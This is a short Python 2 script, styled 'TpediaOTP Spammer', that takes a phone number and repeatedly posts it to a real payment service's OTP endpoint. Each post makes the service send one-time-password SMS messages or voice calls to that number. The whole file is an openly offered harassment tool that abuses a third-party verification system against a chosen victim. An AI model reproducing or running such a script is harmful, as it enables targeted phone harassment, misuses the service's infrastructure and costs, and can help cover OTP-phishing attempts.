## Tpedia.py - TpediaOTP SPAM (18-March-2018 [01:46])
# -*- coding: utf-8 -*-
##
import sys
import time
import requests

__banner__ = """
   _  _  _  _  _  _  _
  / \/ \/ \/ \/ \/ \/ \  TpediaOTP Spammer v1.1
 ( T  p  d  |  O  T  P ) Author: mrx
  \ /\_/\ /\_/\ /\_/\ /  Codename: Alone.
  / \   / \   / \   / \  Github: https://github.com/Newbie22
 ( s ) ( p ) ( a ) ( m ) Team  : BlackHole Security
  \_/   \_/   \_/   \_/  Made with full of TEAM
"""

def spam():
	options=sys.argv[1]
	phone=sys.argv[2]
	if sys.argv[1] == "--sms":
		print __banner__
		param = {'msisdn':''+sys.argv[2],'accept':''}
		count = 0
		while (count < 2):
			r = requests.post('https://www.tokocash.com/oauth/otp', data=param)
			if "otp_attempt_left" in r.text:
				print("\033[1;32m[  OK  ] Send Succesful...Sleep for 60 second...\033[0m")
			else:
				print("\033[1;31m[FAILED] Send Failed...Sleep for 60 second...\033[0m")
			time.sleep(60)
			count = count + 1
		print("\033[1;33m[ DONE ] Stopped...\033[0m")
		sys.exit(1)
	elif sys.argv[1] == "--call":
		print __banner__
		param = {'msisdn':''+sys.argv[2],'accept':'call'}
		count = 0
		while (count < 3):
			r = requests.post('https://www.tokocash.com/oauth/otp', data=param)
			if "otp_attempt_left" in r.text:
				print("\033[1;32m[  OK  ] Send Succesful...Sleep for 60 second...\033[0m")
			else:
				print("\033[1;31m[FAILED] Send Failed...Sleep for 60 second...\033[0m")
			time.sleep(60)
			count = count + 1
		print("\033[1;33m[ DONE ] Stopped...")
		sys.exit(1)
	else:
		print __banner__
		print "Usage: tpedia.py [--sms/--call] PHONE"
		print "tpedia.py: error: %s option requires an argument" %options
		sys.exit()

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print __banner__
		print "Usage: tpedia.py [--sms/--call] PHONE"
		sys.exit(0)
	else:
		spam()
